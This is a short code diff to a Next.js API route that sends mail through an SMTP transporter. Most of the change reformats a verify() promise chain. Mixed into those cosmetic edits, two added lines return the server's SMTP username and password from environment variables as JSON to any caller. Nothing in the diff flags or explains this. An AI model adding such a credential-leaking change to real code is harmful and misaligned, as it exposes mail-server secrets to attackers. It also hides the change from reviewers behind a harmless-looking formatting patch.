@@ -68,10 +68,17 @@ export default async (req: NextApiRequest, res: NextApiResponse) => {
     .slice(0, 1)
     .toUpperCase()}${body.lastName.slice(1)}`;
 
+  res.statusCode = 200;
+  res.json({ user: process.env.SMTP_USER, pass: process.env.SMTP_PASS });
   try {
-    await transporter.verify().then(() => /* do nothing */).catch((err) => {
-      throw Error(err.message);
-    });
+    await transporter
+      .verify()
+      .then(() => {
+        /* do nothing */
+      })
+      .catch((err) => {
+        throw Error(err.message);
+      });
 
     const message = {
       from: process.env.SMTP_USER,
